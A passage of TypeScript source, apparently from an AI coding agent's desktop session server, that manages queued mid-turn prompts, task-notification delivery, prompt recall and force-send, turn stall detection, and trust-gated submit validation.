    return getCommandQueueSnapshot().some(isDeliverableParentTaskNotification)
  }

  /**
   * True when a prompt the user sent mid-turn is still queued. Its turn may
   * have ended without draining it, so it is owed one of its own.
   */
  private hasQueuedParentPrompt(): boolean {
    return getCommandQueueSnapshot().some(isDeliverableParentPrompt)
  }

  private countQueuedParentPrompts(): number {
    return getCommandQueueSnapshot().filter(isDeliverableParentPrompt).length
  }

  /**
   * Schedule rather than start immediately: queue signals are synchronous and
   * AppSessionController announces turn completion before its own finalizer has
   * cleared its abort controller. The sidecar turn finalizer is the safe edge.
   *
   * The awaiting-durable-acceptance latch is NOT checked here, only inside
   * `drainOneTaskNotification`: it holds back worker RESULTS specifically, and
   * every path out of a queued human prompt supplies the durable boundary it is
   * waiting for. Either the running turn consumed the prompt (so that turn
   * persisted it), or it did not and `drainOneQueuedPrompt` below starts a human
   * turn for it right here, ahead of any worker result.
   */
  private scheduleBoundaryDrain(): void {
    if (this.closed) return
    if (this.taskNotificationDrainScheduled) return
    this.taskNotificationDrainScheduled = true
    queueMicrotask(() => {
      this.taskNotificationDrainScheduled = false
      if (this.closed) return
      // A user prompt outranks a worker result, the same way the engine's own
      // queue orders 'next' ahead of 'later'.
      if (this.drainOneQueuedPrompt()) return
      this.drainOneTaskNotification()
    })
  }

  /**
   * The fallback half of the mid-turn queue. A prompt queued into a running turn
   * is normally drained BY that turn (`src/query.ts:1636-1645`), but a turn that
   * ends without another tool round never reaches that drain, so the prompt is
   * still sitting there. Start a turn for it, exactly as the terminal REPL's
   * between-turn processor does (`src/hooks/useQueueProcessor.ts:48-60`).
   *
   * Returns true when a turn was started, so the caller knows not to also start
   * a task-notification turn on the same boundary.
   */
  private drainOneQueuedPrompt(): boolean {
    if (this.closed || this.parking || this.activeTurn) return false
    if (
      this.workspaceTrust &&
      this.workspaceTrust.getSnapshot()?.trusted !== true
    ) {
      return false
    }

    // Re-read at drain time: the turn we were scheduled behind may have drained
    // this prompt itself on its way out.
    const command = dequeue(isDeliverableParentPrompt)
    if (!command) return false

    // D1a — this turn is where a still-staged message becomes a transcript row,
    // so it announces. A command that is NOT staged has already been announced:
    // the only way back onto the queue is the retry below, after a turn that
    // announced it and then failed. Announcing on that retry would print it
    // twice.
    const stagedUuid =
      command.uuid !== undefined && this.stagedPrompts.has(command.uuid)
        ? command.uuid
        : null

    // The user already watched this leave the composer and saw it staged above
    // the composer, so a turn that never accepts it must not end in silence.
    // `onInputPersisted` is the durable-acceptance signal: past it the turn
    // genuinely ran, and a later rejection is an ordinary turn failure the
    // engine reports itself. Before it, nothing took the prompt, so requeue for
    // the next boundary. Retry ONCE per prompt: `startTurn`'s finalizer
    // schedules the next drain, so an unconditional requeue on a turn that
    // always rejects would spin at microtask speed.
    const retryKey = command.uuid ?? promptText(command.value)
    let persisted = false
    const started = this.startTurn({
      prompt: command.value,
      ...(command.uuid !== undefined ? { uuid: command.uuid } : {}),
      ...(command.isMeta !== undefined ? { isMeta: command.isMeta } : {}),
      generateTitle: true,
      announcePrompt: stagedUuid !== null,
      onInputPersisted: () => {
        persisted = true
        this.retriedQueuedPromptKeys.delete(retryKey)
      },
      onSettled: error => {
        if (!error || persisted) return
        if (this.retriedQueuedPromptKeys.has(retryKey)) {
          this.log(
            `[sidecar] queued prompt was refused twice; giving up: ${error.message}`,
          )
          this.retriedQueuedPromptKeys.delete(retryKey)
          return
        }
        this.retriedQueuedPromptKeys.add(retryKey)
        enqueue(command)
      },
    })
    if (started && stagedUuid !== null) {
      // Announced by `startTurn` a moment ago, so it is transcript history now
      // and must stop being staged. Deliberately AFTER the start: an unstarted
      // turn leaves the message staged, which is the honest state.
      this.stagedPrompts.delete(stagedUuid)
      this.broadcastQueuedPrompts()
    }
    if (!started) {
      // Put it back rather than dropping it; the next boundary retries. Note
      // this appends, so with several queued prompts a refused one loses its
      // place. Unreachable today: nothing awaits between the gate above and
      // `startTurn`, so the two conditions it refuses on cannot have changed.
      enqueue(command)
    }
    return started
  }

  private drainOneTaskNotification(): void {
    if (
      this.closed ||
      this.parking ||
      this.activeTurn ||
      this.taskNotificationAwaitingDurableAcceptance
    ) {
      return
    }
    if (
      this.workspaceTrust &&
      this.workspaceTrust.getSnapshot()?.trusted !== true
    ) {
      return
    }

    // Re-read at drain time. A live QueryEngine turn may have consumed this
    // notification through its normal mid-turn queue drain after we scheduled.
    const command = dequeue(isDeliverableParentTaskNotification)
    if (!command || typeof command.value !== 'string') return
    const reservationTaskId = reserveTaskNotification(command)
    let persisted = false

    const origin: MessageOrigin =
      queuedCommandOrigin(command) ?? { kind: 'task-notification' }
    const started = this.startTurn({
      prompt: command.value,
      origin,
      // HOST-REQUEST-PLANE §4 step 4 — `false` is right for a worker RESULT,
      // which is why this drain has always passed it, and wrong for a peer
      // message: a session created by a peer would otherwise carry the cwd
      // basename forever, because its first prompt arrives here rather than
      // through `handleSubmit`. Turning it on for a `peer` origin is safe
      // without a second title check here: the generator is already run-once,
      // fresh-only, resumed-never and no-clobber (`sessionTitleGen.ts`), so on
      // a session that HAS a title this is a no-op, which is exactly the
      // decision's "on a session whose title is unset".
      generateTitle: origin.kind === 'peer',
      onInputPersisted: () => {
        persisted = true
        releaseTaskNotificationReservation(reservationTaskId)
      },
      onSettled: error => {
        if (!persisted) {
          // Do not silently lose a result if an adapter completes before the
          // QueryEngine's durable acknowledgement. Hold the requeued report
          // until a later human turn supplies a fresh safe boundary.
          this.taskNotificationAwaitingDurableAcceptance = true
          releaseTaskNotificationReservation(reservationTaskId)
          enqueuePendingNotification(command)
          this.log(
            `[sidecar] task-notification was not durably accepted; handoff deferred${
              error ? `: ${error.message}` : ''
            }`,
          )
        } else {
          if (error) {
            this.log(
              `[sidecar] task-notification turn failed after acceptance: ${error.message}`,
            )
          }
        }
      },
    })
    if (!started) {
      releaseTaskNotificationReservation(reservationTaskId)
      enqueuePendingNotification(command)
    }
  }

  /**
   * The one sidecar-owned turn-start path. Human frames and internal worker
   * notifications differ only in validation/error handling performed before
   * reaching this method; both use the same active-turn and raw-event path.
   */
  private startTurn({
    prompt,
    uuid = randomUUID(),
    isMeta,
    goalSnapshot,
    origin,
    onInputPersisted,
    generateTitle,
    announcePrompt = true,
    onRejected,
    onSettled,
  }: {
    prompt: AppSessionPrompt
    uuid?: string
    isMeta?: boolean
    goalSnapshot?: ReturnType<typeof parseThreadGoal>
    origin?: MessageOrigin
    onInputPersisted?: () => void
    generateTitle: boolean
    /**
     * False only for a prompt whose user message has ALREADY been broadcast: a
     * boundary-drained message whose turn failed and was requeued
     * (`drainOneQueuedPrompt`). Announcing it again would print it twice. A
     * message still waiting for its first turn announces here, which is what
     * makes the announcement happen at delivery rather than at send time (D1a).
     */
    announcePrompt?: boolean
    onRejected?: (error: Error) => void
    onSettled?: (error?: Error) => void
  }): boolean {
    if (this.parking || this.activeTurn || this.conversationMutationInFlight) {
      return false
    }
    this.runControls?.lockProviderSwitches()
    this.activeTurn = true
    this.beginTurnObservation()
    if (announcePrompt) {
      this.broadcastPromptMessage(prompt, uuid, isMeta, origin)
    }
    const titlePrompt = generateTitle ? promptText(prompt).trim() : ''

    let submitPromise: Promise<void>
    try {
      submitPromise = this.controller.submit(prompt, {
        uuid,
        isMeta,
        ...(goalSnapshot !== undefined ? { goalSnapshot } : {}),
        ...(origin !== undefined ? { origin } : {}),
        onInputPersisted: () => {
          onInputPersisted?.()
          if (titlePrompt) {
            void this.titleGenerator.maybeGenerate(titlePrompt, title =>
              this.broadcastSessionTitle(title),
            )
          }
        },
      })
    } catch (error) {
      this.activeTurn = false
      this.endTurnObservation('failed')
      // D1a — the announcement above already happened, so this prompt is
      // transcript history even though no turn survived to carry it. Leaving it
      // staged would have the next boundary drain announce it a second time,
      // and the retry cap cannot intervene: `onSettled` rides the promise this
      // path never created. Kept rather than removed with the catch, because
      // the catch is also what keeps `activeTurn` and the turn-observation pair
      // (A1) honest; without it a synchronous throw would wedge the session for
      // good.
      if (announcePrompt && this.stagedPrompts.delete(uuid)) {
        this.broadcastQueuedPrompts()
      }
      this.scheduleBoundaryDrain()
      return false
    }

    let rejection: Error | undefined
    void submitPromise
      .catch(error => {
        const normalized = error instanceof Error ? error : new Error(String(error))
        rejection = normalized
        onRejected?.(normalized)
      })
      .finally(() => {
        this.activeTurn = false
        // The submit promise resolving is not the turn succeeding. The engine
        // returns most failures as a result frame rather than a rejection, so
        // reading only the promise logged a turn that ended in an error as
        // `ok`. A turn that recovered from an interruption emits one final
        // successful result and stays `ok`; an exhausted recovery emits an
        // error result and is recorded as what it was.
        this.endTurnObservation(
          rejection || this.turnResultFailed ? 'failed' : 'ok',
        )
        onSettled?.(rejection)
        // D1b — the late-delivery window closes with the turn: no engine
        // consumption signal for these uuids can arrive after it. Holding them
        // past this pins a full prompt each, images included, for a message the
        // user took back.
        this.recalledPrompts.clear()
        this.scheduleBoundaryDrain()
      })
    return true
  }

  /**
   * A1 (`docs/reports/2026-08-10-overnight-hang-log-request.md`) — a turn that
   * hangs and a session sitting idle wrote the same log: nothing. Start and
   * completion pair on every route out of `startTurn`, including the synchronous
   * throw, so an unpaired `started` means the turn really never finished.
   */
  private beginTurnObservation(): void {
    const startedAt = Date.now()
    this.turnStartedAtMs = startedAt
    this.turnLastEventAtMs = startedAt
    this.turnEventCount = 0
    this.turnResultSeen = false
    this.turnResultFailed = false
    this.turnStallReported = false
    this.onTurnLifecycle?.({ kind: 'started' })
    this.armTurnStallTimer(this.turnStallMs)
  }

  private endTurnObservation(outcome: 'ok' | 'failed'): void {
    if (this.turnStartedAtMs === 0) return
    const durationMs = Date.now() - this.turnStartedAtMs
    this.turnStartedAtMs = 0
    this.clearTurnStallTimer()
    this.onTurnLifecycle?.({ kind: 'completed', durationMs, outcome })
  }

  /** Engine liveness for the running turn, and the one phase fact we hold. */
  private observeTurnEvent(event: AppSessionEvent): void {
    if (this.turnStartedAtMs === 0) return
    // Messages ONLY. `turn.status` is this controller's own bookkeeping and it
    // fires at both ends of every turn, so counting it as liveness would have
    // reset the quiet clock without the engine having produced anything.
    if (event.type !== 'message') return
    this.turnEventCount++
    this.turnLastEventAtMs = Date.now()
    if (event.message.type === 'result') {
      this.turnResultSeen = true
      this.turnResultFailed = event.message.is_error === true
    }
  }

  private armTurnStallTimer(delayMs: number): void {
    this.clearTurnStallTimer()
    if (this.turnStallMs <= 0) return
    const timer = setTimeout(() => {
      this.turnStallTimer = null
      if (this.turnStartedAtMs === 0 || this.turnStallReported) return
      const quietMs = Date.now() - this.turnLastEventAtMs
      // A long turn is not a stalled one, and neither is one waiting on a
      // permission the user has not answered: that wait is designed, and its
      // pending request is state this server directly holds. Re-arming for the
      // remaining quiet window is not a repeated record: nothing is written on
      // this path, and the report below still happens at most once per turn (§5).
      if (quietMs < this.turnStallMs || this.controller.getPendingPermissionRequests().length > 0) {
        this.armTurnStallTimer(quietMs < this.turnStallMs ? this.turnStallMs - quietMs : this.turnStallMs)
        return
      }
      this.turnStallReported = true
      this.onTurnLifecycle?.({
        kind: 'stalled',
        elapsedMs: Date.now() - this.turnStartedAtMs,
        // Read off held state only: whether the engine emitted this turn's
        // result, and whether it emitted anything at all. Never inferred from
        // the shape of the silence (OBSERVABILITY-MINIMUM.md §4).
        phase: this.turnEventCount === 0
          ? 'unknown'
          : this.turnResultSeen ? 'post_result' : 'awaiting_result',
      })
      // Deliberately NOT re-armed and deliberately not aborting the turn: the
      // hung state is the evidence, and killing it destroys what explains it.
    }, delayMs)
    timer.unref?.()
    this.turnStallTimer = timer
  }

  private clearTurnStallTimer(): void {
    if (!this.turnStallTimer) return
    clearTimeout(this.turnStallTimer)
    this.turnStallTimer = null
  }

  /**
   * The transcript row for a prompt the user sent. Raw-fidelity `user` event,
   * identical whether the prompt starts a turn or is queued into a running one,
   * so the renderer needs no new frame kind and no new variant to display it.
   */
  private broadcastPromptMessage(
    prompt: AppSessionPrompt,
    uuid: string,
    isMeta?: boolean,
    origin?: MessageOrigin,
  ): void {
    this.broadcastEvent(
      createMessageEvent({
        type: 'user',
        message: { role: 'user', content: prompt },
        session_id: this.engineSessionId,
        parent_tool_use_id: null,
        uuid: uuid as SDKUserMessage['uuid'],
        timestamp: new Date().toISOString(),
        ...(isMeta ? { isSynthetic: true } : {}),
        ...toSDKMessageOriginProp(origin),
      }),
    )
  }

  /**
   * Hand a mid-turn prompt to the engine's own command queue. The running
   * turn's next tool round drains it (`src/query.ts:1636-1645`) and injects it
   * as an attachment, so the model sees it DURING the response rather than in a
   * turn afterwards. `mode: 'prompt'` and the default `'next'` priority are what
   * that drain filters on; `agentId` stays undefined so it addresses the main
   * thread and never a subagent.
   *
   * D1a — the user message is NOT broadcast here. Until the engine takes it, the
   * message has not reached the model, and a transcript row says it has. It is
   * staged instead (`stagedPrompts` + the outbound snapshot), which is what the
   * terminal does with a queued message, and announced exactly once by whichever
   * path delivers it: `commitStagedPrompt` when the running turn consumes it, or
   * `drainOneQueuedPrompt` when the turn ends first and it gets a turn of its
   * own. Staging BEFORE the enqueue matters: the queue's change signal is
   * synchronous, so the snapshot it publishes must already know about this one.
   */
  private enqueueMidTurnPrompt(prompt: AppSubmitPrompt, isMeta?: boolean): void {
    const uuid = randomUUID()
    this.stagedPrompts.set(uuid, { prompt, ...(isMeta ? { isMeta } : {}) })
    enqueue({
      value: prompt,
      mode: 'prompt',
      uuid,
      ...(isMeta ? { isMeta: true } : {}),
    })
  }

  /**
   * D1a — a staged message the engine has just taken into the running turn. The
   * transcript row is written HERE, at delivery, and the staged row disappears
   * with it. Unknown uuids (a worker result, a prompt already announced) are
   * ignored: the map is the whole vocabulary of what is still owed a row.
   */
  private commitStagedPrompt(uuid: string): void {
    const staged = this.stagedPrompts.get(uuid)
    if (!staged) {
      // D1b — a message a recall took back that the engine turns out to have
      // taken first. It IS in the model's context now, so it belongs in the
      // transcript regardless of what the user was told a moment ago; the
      // alternative is a message the model answers and the transcript denies.
      const recalled = this.recalledPrompts.get(uuid)
      if (!recalled) return
      this.recalledPrompts.delete(uuid)
      this.broadcastPromptMessage(recalled.prompt, uuid, recalled.isMeta)
      // The recall answered "took it back" a moment ago, and this is the only
      // point where that turns out to be false. Correcting it here is what
      // makes the promise honest: without this the user is told the message is
      // theirs again while the model answers it, and they resend. Counted rather
      // than sent, so one recall produces one correction with the true number.
      this.noteLateRecallDelivery(recalled.requestId)
      return
    }
    this.stagedPrompts.delete(uuid)
    this.broadcastPromptMessage(staged.prompt, uuid, staged.isMeta)
    this.broadcastQueuedPrompts()
  }

  /**
   * D1a — what is waiting for the running response, oldest first.
   *
   * Built from the LIVE queue intersected with the not-yet-announced map, so it
   * carries exactly the messages that are both still queued and still absent
   * from the transcript. A message the engine consumed has left the queue; a
   * message a boundary drain started a turn for has left the map. Neither can
   * leave a row behind.
   */
  private queuedPromptItems(): QueuedPromptItem[] {
    const items: QueuedPromptItem[] = []
    for (const command of getCommandQueueSnapshot()) {
      if (!isDeliverableParentPrompt(command)) continue
      const uuid = command.uuid
      if (uuid === undefined || !this.stagedPrompts.has(uuid)) continue
      items.push({
        id: uuid,
        text: promptPreviewText(command.value, MAX_QUEUED_PROMPT_PREVIEW_CHARS),
      })
    }
    return items
  }

  private sendQueuedPrompts(
    connection: Connection,
    prompts: QueuedPromptItem[],
  ): void {
    this.send(connection, {
      kind: 'queued-prompts.snapshot',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      prompts,
    })
  }

  /**
   * Change-detected: the queue signal this rides also fires for worker results
   * and for every task-notification enqueue, none of which move this list. A
   * session with busy subagents would otherwise pay a frame (and a delivery
   * trace) per unrelated queue event to say nothing changed.
   *
   * The staged map is read FIRST because change detection only suppresses the
   * frame, not the work behind it: building the key walks the whole live queue,
   * folds each command's text blocks, and stringifies the result. With nothing
   * staged the answer is already known to be the empty list, and every one of a
   * busy subagent session's queue events lands here.
   */
  private broadcastQueuedPrompts(): void {
    if (
      this.stagedPrompts.size === 0 &&
      this.lastQueuedPromptsKey === EMPTY_QUEUED_PROMPTS_KEY
    ) {
      return
    }
    const prompts = this.queuedPromptItems()
    const key = JSON.stringify(prompts)
    if (key === this.lastQueuedPromptsKey) return
    // Commit the key only once it is actually published. Recording it against
    // zero connections would remember a change nobody received, and the attach
    // path only re-sends a NON-empty list, so a list that emptied during a
    // disconnect could never be corrected: main's sticky slot would keep
    // showing a message as waiting that the turn had already taken.
    if (this.connections.size === 0) return
    this.lastQueuedPromptsKey = key
    for (const connection of this.connections) {
      this.sendQueuedPrompts(connection, prompts)
    }
  }

  /**
   * D1b — take back every message waiting for the running response (protocol.ts:
   * PROMPT_RECALL_VERB_TYPES). Same fail-closed order as the other app-owned
   * verbs: sidecar-LOCAL structural schema → the engine's OWN queue primitive →
   * a `prompt-recall.result` echoing the requestId (T5a-analog).
   *
   * Removal is `dequeueAllMatching` composed with this server's own
   * `isDeliverableParentPrompt`, which is what keeps the blast radius honest:
   * it returns the commands in queue order (so the composer can be rebuilt in
   * the order they were sent), and `agentId === undefined` means a subagent's
   * queued work is not reachable. `popAllEditable` is deliberately NOT used —
   * its editable filter has no `agentId` check — and neither is
   * `clearCommandQueue`, which would also drop task notifications and abandon
   * the deferred continuations they carry.
   *
   * The staged intersection narrows it once more, to exactly what the user was
   * shown: a prompt that is queued but NOT staged is one whose turn already
   * announced it and failed (`drainOneQueuedPrompt`'s requeue). It has a
   * transcript row, so handing it back to the composer would duplicate it.
   */
  private handlePromptRecall(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const rawRequestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    // IDLE-PARK (decisions/IDLE-PARK.md §3, R2-F2) — same first line as
    // `handleSubmit`, same code, same retryability. A latched sidecar is
    // exiting, so accepting a recall here would take messages off the queue and
    // hand them back over a connection that is about to go away: the composer
    // never receives them and the queue no longer holds them. The user unparks
    // and asks again.
    if (this.parking) {
      this.sendError(
        connection,
        rawRequestId,
        'session_disconnected',
        'session parking',
        true,
      )
      return
    }

    const parsed = promptRecallMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        rawRequestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid prompt-recall verb',
        false,
      )
      return
    }
    const { requestId } = parsed.data

    // Read BEFORE the removal: it is the count the user was looking at, and the
    // only thing the gap below can be measured against.
    const stagedCount = this.stagedPrompts.size
    const removed = dequeueAllMatching(
      command =>
        isDeliverableParentPrompt(command) &&
        command.uuid !== undefined &&
        this.stagedPrompts.has(command.uuid),
    )

    const recalled: RecalledPrompt[] = []
    for (const command of removed) {
      const uuid = command.uuid
      if (uuid === undefined) continue
      const staged = this.stagedPrompts.get(uuid)
      if (!staged) continue
      this.stagedPrompts.delete(uuid)
      this.rememberRecalledPrompt(uuid, { ...staged, requestId })
      recalled.push({ id: uuid, prompt: staged.prompt })
    }
    this.broadcastQueuedPrompts()

    // Defensive only, and deliberately not the mechanism. Every transition that
    // unstages a prompt also takes it off the queue in the SAME synchronous
    // block (`src/query.ts:1836-1842`; the boundary drain's unawaited
    // `startTurn` then `stagedPrompts.delete`), and this handler runs
    // synchronously off `handleData`, so it cannot observe the gap. The race
    // that is real leaves the command queued and recalls it successfully, and
    // is corrected from `commitStagedPrompt` when the delivery signal lands.
    const alreadyDelivered = Math.max(0, stagedCount - recalled.length)
    this.broadcastPromptRecallResult({
      kind: 'prompt-recall.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId,
      ok: alreadyDelivered === 0,
      message: promptRecallMessage(recalled.length, alreadyDelivered),
      recalled,
      alreadyDelivered,
    })
  }

  /**
   * D1b — both recall answers take this path. The messages are OFF the queue and
   * out of the staged map by the time either is built, so this frame is the only
   * vehicle carrying them anywhere the user can reach: a unicast that lost its
   * race with the connection being removed would leave the text nowhere at all.
   * The renderer acts only on a requestId it minted itself, so the fan-out costs
   * a frame per extra connection and changes nothing for the ones that did not
   * ask.
   */
  private broadcastPromptRecallResult(
    frame: Extract<ServerFrame, { kind: 'prompt-recall.result' }>,
  ): void {
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
  }

  /**
   * D1b — record that one more of a recall's messages went to the model anyway,
   * and make sure exactly one correction reports the whole count.
   *
   * The flush is a microtask, not a timer: the engine's consumption loop is
   * synchronous, so every uuid it is about to signal has been counted by the time
   * the microtask runs, and nothing observable happens in between.
   */
  private noteLateRecallDelivery(requestId: string): void {
    this.lateRecallDeliveries.set(
      requestId,
      (this.lateRecallDeliveries.get(requestId) ?? 0) + 1,
    )
    if (this.lateRecallFlushScheduled) return
    this.lateRecallFlushScheduled = true
    queueMicrotask(() => {
      this.lateRecallFlushScheduled = false
      const corrections = [...this.lateRecallDeliveries]
      this.lateRecallDeliveries.clear()
      if (this.closed) return
      for (const [correctedRequestId, alreadyDelivered] of corrections) {
        this.broadcastPromptRecallResult({
          kind: 'prompt-recall.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: correctedRequestId,
          ok: false,
          message: promptRecallMessage(0, alreadyDelivered),
          recalled: [],
          alreadyDelivered,
        })
      }
    })
  }

  /** D1b — remember a recalled message, oldest out past the queue depth cap. */
  private rememberRecalledPrompt(
    uuid: string,
    entry: { prompt: AppSubmitPrompt; isMeta?: boolean; requestId: string },
  ): void {
    this.recalledPrompts.set(uuid, entry)
    while (this.recalledPrompts.size > MAX_QUEUED_PROMPTS) {
      const oldest = this.recalledPrompts.keys().next()
      if (oldest.done) break
      this.recalledPrompts.delete(oldest.value)
    }
  }

  /**
   * Interrupt only while the renderer-named engine prompt is still the live queue
   * head. This identity check is what makes delayed and duplicate clicks safe:
   * once the boundary drain starts that prompt, it leaves `queuedPromptItems`
   * before another force frame can reach the new turn.
   */
  private handlePromptForce(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined
    const parsed = promptForceMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid prompt-force verb',
        false,
      )
      return
    }

    const { promptId } = parsed.data
    if (this.parking) {
      this.send(connection, {
        kind: 'prompt-force.result',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        requestId: parsed.data.requestId,
        promptId,
        ok: false,
        message: 'The session is parking.',
      })
      return
    }
    const head = this.queuedPromptItems()[0]
    if (head?.id !== promptId) {
      this.send(connection, {
        kind: 'prompt-force.result',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        requestId: parsed.data.requestId,
        promptId,
        ok: false,
        message: 'That message is no longer waiting.',
      })
      return
    }

    if (this.activeTurn) {
      this.controller.abort('force-send')
    } else {
      this.scheduleBoundaryDrain()
    }
    this.send(connection, {
      kind: 'prompt-force.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: parsed.data.requestId,
      promptId,
      ok: true,
      message: 'Sending the queued message now.',
    })
  }

  /**
   * ONE SUBMIT, ONE ANSWER. Every exit from this method either accepts the
   * prompt or refuses it, and each one answers `submitId` exactly once
   * (`refuseSubmit` / `answerSubmit`), from the same synchronous dispatch that
   * decided the outcome. That is what makes the renderer's retained copy exact
   * instead of inferred (SubmitResultFrame).
   *
   * `startTurn`'s ASYNC `onRejected` is deliberately not one of those exits: by
   * the time it fires the prompt has been accepted AND announced as a transcript
   * row, so the turn failed with the message already delivered. It reports that
   * as an ordinary error, and handing the text back on top of its own transcript
   * row would give the user the same message twice.
   */
  private handleSubmit(
    connection: Connection,
    message: AppSubmitMessage,
    submitId: string | undefined,
  ): void {
    const refuseSubmit = (
      code: ErrorFrame['code'],
      text: string,
      retryable: boolean,
    ): void => {
      this.sendError(connection, message.requestId, code, text, retryable)
      this.answerSubmit(connection, submitId, { accepted: false, code })
    }

    // IDLE-PARK (decisions/IDLE-PARK.md §3, R2-F2) — a submit that arrives AFTER
    // the parking latch is rejected before `activeTurn` is touched: the turn
    // never starts (`controller.submit` never called) → NO turn loss. This is
    // the FIRST line so no other gate can start a turn on a parking sidecar.
    // `session_disconnected` is an existing ErrorFrame code the renderer already
    // folds to disconnected/inputEnabled:false — no new error code, no renderer
    // change. Retryable: the user unparks (restore-on-click) and re-sends.
    if (this.parking) {
      refuseSubmit('session_disconnected', 'session parking', true)
      return
    }
    if (this.conversationMutationInFlight) {
      refuseSubmit(
        'turn_already_running',
        'Conversation update in progress.',
        true,
      )
      return
    }

    // P4-15 TRUST BOUNDARY (SECURITY-MINIMUM — validate at the sidecar, not the
    // renderer). A turn runs the engine with tools + HOOKS at the session's cwd.
    // The renderer's trust gate is UX only: enforce trust HERE so no renderer
    // path (queued-prompt drain, command palette, a future feature, or a
    // compromised renderer) can run a turn at an untrusted cwd. Hooks in
    // particular do NOT self-gate on the non-interactive sidecar path
    // (`shouldSkipHookDueToTrust()` returns false when
    // `getIsNonInteractiveSession()` is true), so this block is what makes trust
    // real. Fail closed with a typed error; degrade gracefully (no crash).
    // Fail CLOSED (P4-25, review B1): block unless EXPLICITLY trusted. `!== true`
    // treats a null snapshot (spawn read failure) and `false` alike — the old
    // `=== false` let null through (`undefined === false` is false → gate skipped).
    // The domain-absent path (no trust domain constructed, e.g. a probe) stays
    // permissive so it isn't a submit gate on non-session code paths.
    if (this.workspaceTrust && this.workspaceTrust.getSnapshot()?.trusted !== true) {
      refuseSubmit(
        'unauthorized',
        'Workspace is not trusted. Accept the trust prompt before running a turn.',
        false,
      )
      return
    }

    // T7 (F4) — prompt cap in UTF-8 BYTES (not JS chars), consistent with the
    // frame byte cap so a multibyte prompt cannot advertise a size the frame
    // cannot carry.
    const promptBytes = Buffer.byteLength(
      typeof message.prompt === 'string'
        ? message.prompt
        : JSON.stringify(message.prompt),
      'utf8',
    )
    if (promptBytes > MAX_PROMPT_BYTES) {
      refuseSubmit('bad_request', `prompt exceeds ${MAX_PROMPT_BYTES} bytes`, false)
      return
    }

    // T4 — `goalSnapshot` arrives as `z.unknown()`. It becomes the diagnostic
    // session identity (AppSessionController.ts:189), so it must be validated to
    // the real `ThreadGoal` shape before it touches session state. Reuse the
    // engine's own `parseThreadGoal` (returns null on any bad shape) as the
    // safeParse. A present-but-invalid snapshot is rejected; absent is fine.
    let goalSnapshot: ReturnType<typeof parseThreadGoal> | undefined
    if (message.options && 'goalSnapshot' in message.options) {
      const raw = message.options.goalSnapshot
      if (raw !== undefined) {
        const validated = parseThreadGoal(raw)
        if (!validated) {
          refuseSubmit(
            'bad_request',
            'goalSnapshot is not a valid ThreadGoal',
            false,
          )
          return
        }
        goalSnapshot = validated
      } else {
        goalSnapshot = null
      }
    }

    // A previous fallback adapter may have left a completion queued without a
    // durable ack. A human turn is a new, explicitly accepted safe boundary.
    this.taskNotificationAwaitingDurableAcceptance = false

    // MID-TURN SUBMIT — the engine takes one turn at a time
    // (`AppSessionController.submit` throws on a second,
    // `src/app-runtime/AppSessionController.ts:139`), but that is not the same
    // as refusing the prompt. The engine's query loop drains the process-global
    // command queue at every tool round and injects what it finds into the
    // RUNNING turn (`src/query.ts:1636-1645` → `getQueuedCommandAttachments`,
    // `src/utils/attachments.ts:1056`), which is how the terminal REPL has
    // always handled typing mid-response. Queue it there rather than answering
    // `turn_already_running`, so the desktop reaches the model at the same
    // point the terminal would. The queue is process-global and this process
    // owns exactly one engine session (N-process model), so there is no
    // cross-session leak; `agentId: undefined` addresses the main thread, which
    // is what the drain's `isMainThread` branch reads.
    if (this.activeTurn) {
      // T7 depth bound. The per-frame and per-window caps above bound arrival
      // RATE; the old refusal was what bounded how much could pile up. Queueing
      // restores the terminal's behaviour, so the depth needs its own cap or a
      // flooding renderer fills the running turn's context wholesale.
      if (this.countQueuedParentPrompts() >= MAX_QUEUED_PROMPTS) {
        refuseSubmit(
          'bad_request',
          'Too many messages are already waiting for this response.',
          false,
        )
        return
      }
      // Fail closed rather than dropping a field we just validated. A goal
      // snapshot is session identity applied by `controller.submit`, and the
      // queue has nowhere to carry it: the engine's drain turns a queued command
      // into an attachment, not a submit. No renderer sends one on this path
      // today, so this rejects nothing that exists; it exists so the first
      // caller that does gets told, instead of losing it silently.
      if (goalSnapshot !== undefined) {
        refuseSubmit(
          'bad_request',
          // Phrased as an identifier diagnostic, like the `goalSnapshot is not
          // a valid ThreadGoal` rejection above it: no legitimate renderer takes
          // this branch, so it addresses whoever wrote the caller, not a reader.
          'goalSnapshot cannot ride a submit sent during a running turn',
          false,
        )
        return
      }
      this.enqueueMidTurnPrompt(message.prompt, message.options?.isMeta)
      // Staged, so the prompt is taken: the running turn's next tool round
      // drains it. Answered HERE rather than off the staged snapshot the enqueue
      // publishes, because that snapshot is republished on every queue change and
      // says nothing about which submit caused this one.
      this.answerSubmit(connection, submitId, { accepted: true })
      return
    }

    const started = this.startTurn({
      prompt: message.prompt,
      isMeta: message.options?.isMeta,
      goalSnapshot,
      generateTitle: true,
      onRejected: error => {
        this.sendError(
          connection,
          message.requestId,
          error.message === 'Session turn already running'
            ? 'turn_already_running'
            : 'internal_error',
          error.message,
          error.message === 'Session turn already running',
        )
      },
    })
    if (!started) {
      refuseSubmit('turn_already_running', 'Session turn already running', true)
      return
    }
    // The turn is running and the user message has been broadcast. Nothing later
    // can un-accept this submit (see the method doc on `onRejected`).
    this.answerSubmit(connection, submitId, { accepted: true })
  }

  /**
   * IDLE-PARK (decisions/IDLE-PARK.md §3) — the host-initiated park handler. It
   * NEVER sends an ack/refuse frame on the happy or the declined path: the
   * exit-code is the authoritative signal (a declined park is silently a no-op;
   * main re-evaluates on its next trigger). The ONLY frame it can send is a
